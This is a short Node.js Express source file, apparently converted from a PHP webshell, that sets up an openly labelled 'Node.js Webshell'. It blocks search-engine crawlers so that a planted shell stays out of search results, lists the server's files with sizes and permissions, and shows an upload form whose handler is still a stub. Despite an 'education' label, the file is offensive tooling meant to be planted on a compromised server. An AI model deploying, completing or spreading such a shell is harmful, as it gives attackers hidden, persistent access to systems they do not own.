// Konversi Webshell R.php ke Node.js (EDUKASI/FORCESEC)

const express = require('express');
const fs = require('fs');
const path = require('path');
const os = require('os');
const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));

// Middleware Block Search Engine Bots
app.use((req, res, next) => {
  const ua = req.headers['user-agent']?.toLowerCase() || '';
  const bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandex'];
  if (bots.some(bot => ua.includes(bot))) {
    return res.status(403).send('Bot access denied.');
  }
  next();
});

// Main Interface
app.get('/', (req, res) => {
  const cwd = process.cwd();
  let files = fs.readdirSync(cwd);
  files = files.map(file => {
    const stats = fs.statSync(path.join(cwd, file));
    return {
      name: file,
      size: stats.size,
      isFile: stats.isFile(),
      perms: stats.mode.toString(8),
      mtime: stats.mtime
    };
  });
  res.send(`
    <h2>Node.js Webshell</h2>
    <form method="POST" enctype="multipart/form-data" action="/upload">
      <input type="file" name="file" />
      <input type="submit" value="Upload" />
    </form>
    <h3>File List:</h3>
    <ul>
      ${files.map(f => `<li>${f.name} - ${f.isFile ? 'File' : 'Dir'} - ${f.size} bytes - ${f.perms}</li>`).join('')}
    </ul>
  `);
});

// Upload Handler (needs multer or manual parser)
app.post('/upload', (req, res) => {
  res.send('Upload not implemented. Use multer or raw parser.');
});

app.listen(port, () => {
  console.log(`Webshell running at http://localhost:${port}`);
});
